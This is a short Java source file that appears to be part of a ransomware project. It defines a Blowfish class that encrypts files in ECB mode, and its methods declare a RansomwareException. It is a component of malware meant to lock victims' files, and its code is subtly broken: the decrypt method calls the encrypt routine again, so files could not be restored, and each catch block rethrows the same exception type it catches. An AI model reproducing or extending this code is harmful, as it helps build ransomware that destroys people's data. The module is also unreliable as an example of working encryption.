package Agent.EncryptionAlgo;

import java.io.File;
import java.security.GeneralSecurityException;

import javax.crypto.SecretKey;

import Agent.Utils.JavaCryptoUtil;
import Agent.exceptions.CryptoException;
import Agent.exceptions.RansomwareException;

public class Blowfish   implements CryptoAlgorithm {

	@Override
	public void encrypt(SecretKey skey, File fileToEncrypt)  throws RansomwareException {

		try {
			JavaCryptoUtil.encrypt(skey, fileToEncrypt, "Blowfish/ECB/PKCS5Padding");
		} catch (CryptoException e) {
			throw new CryptoException("problem with encrypting", e.getCause());
		}

	}

	@Override
	public void decrypt(SecretKey skey, File fileToDecrypt) throws RansomwareException {

		try {
			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "Blowfish/ECB/PKCS5Padding");
		} catch (CryptoException e) {
			throw new CryptoException("problem with decrypting", e.getCause());
		}
	}

}

